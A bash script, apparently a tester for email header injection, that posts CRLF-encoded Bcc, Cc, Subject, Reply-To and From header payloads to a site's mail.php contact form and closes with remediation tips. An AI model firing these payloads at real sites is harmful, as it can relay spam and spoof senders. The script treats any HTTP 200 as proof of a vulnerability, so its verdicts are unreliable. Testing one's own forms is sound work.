#!/usr/bin/env bash
# Mail Injection Testing Script
# Focused testing for mail script vulnerabilities

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET_URL="$1"
VERBOSE=false

if [[ -z "$TARGET_URL" ]]; then
    echo "Usage: $0 [OPTIONS] <TARGET_URL>"
    echo ""
    echo "Options:"
    echo "  -v, --verbose    Verbose output"
    echo "  -h, --help       Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 https://example.com/contact"
    echo "  $0 -v https://example.com/contact"
    exit 1
fi

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            echo "Mail Injection Testing Script"
            echo "Tests for email header injection vulnerabilities"
            exit 0
            ;;
        *)
            TARGET_URL="$1"
            shift
            ;;
    esac
done

# Ensure URL ends with /
if [[ ! "$TARGET_URL" =~ /$ ]]; then
    TARGET_URL="${TARGET_URL}/"
fi

echo -e "${BLUE}🔍 Mail Injection Testing: $TARGET_URL${NC}"
echo ""

# Test 1: Email header injection
echo -e "${YELLOW}Test 1: Email Header Injection${NC}"
echo "Testing BCC injection via email field..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@evil.com%0d%0aBcc:spam@victim1.com,spam@victim2.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: BCC injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: BCC injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 2: Subject line injection
echo -e "${YELLOW}Test 2: Subject Line Injection${NC}"
echo "Testing subject injection via name field..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test%0d%0aSubject:URGENT%20SECURITY%20ALERT&email=test@test.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: Subject injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: Subject injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 3: Reply-To manipulation
echo -e "${YELLOW}Test 3: Reply-To Manipulation${NC}"
echo "Testing Reply-To injection..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@evil.com%0d%0aReply-To:attacker@evil.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: Reply-To injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: Reply-To injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 4: CC injection
echo -e "${YELLOW}Test 4: CC Injection${NC}"
echo "Testing CC injection..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@evil.com%0d%0aCc:spam@victim.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: CC injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: CC injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 5: From header injection
echo -e "${YELLOW}Test 5: From Header Injection${NC}"
echo "Testing From header injection..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@evil.com%0d%0aFrom:admin@company.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: From header injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: From header injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 6: Multiple header injection
echo -e "${YELLOW}Test 6: Multiple Header Injection${NC}"
echo "Testing multiple header injection..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@evil.com%0d%0aBcc:spam1@victim.com%0d%0aCc:spam2@victim.com%0d%0aSubject:SPAM&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: Multiple header injection possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: Multiple header injection blocked (HTTP $response)${NC}"
fi
echo ""

# Test 7: Email validation bypass
echo -e "${YELLOW}Test 7: Email Validation Bypass${NC}"
echo "Testing email validation with injection..."
response=$(curl -s -X POST "$TARGET_URL"mail.php \
    -d "name=Test&email=test@test.com%0d%0aBcc:spam@victim.com&message=Test" \
    -w "%{http_code}")
if [[ "$response" == "200" ]]; then
    echo -e "${RED}❌ VULNERABLE: Email validation bypass possible (HTTP $response)${NC}"
else
    echo -e "${GREEN}✅ SECURE: Email validation working (HTTP $response)${NC}"
fi
echo ""

echo -e "${BLUE}🔍 Mail injection testing completed!${NC}"
echo ""
echo "Summary:"
echo "- Check results above for email header injection vulnerabilities"
echo "- Green ✅ means the test passed (secure)"
echo "- Red ❌ means a vulnerability was found"
echo ""
echo "If vulnerabilities are found:"
echo "1. Implement proper input sanitization"
echo "2. Validate email format strictly"
echo "3. Sanitize all user inputs before using in email headers"
echo "4. Use parameterized email sending functions"
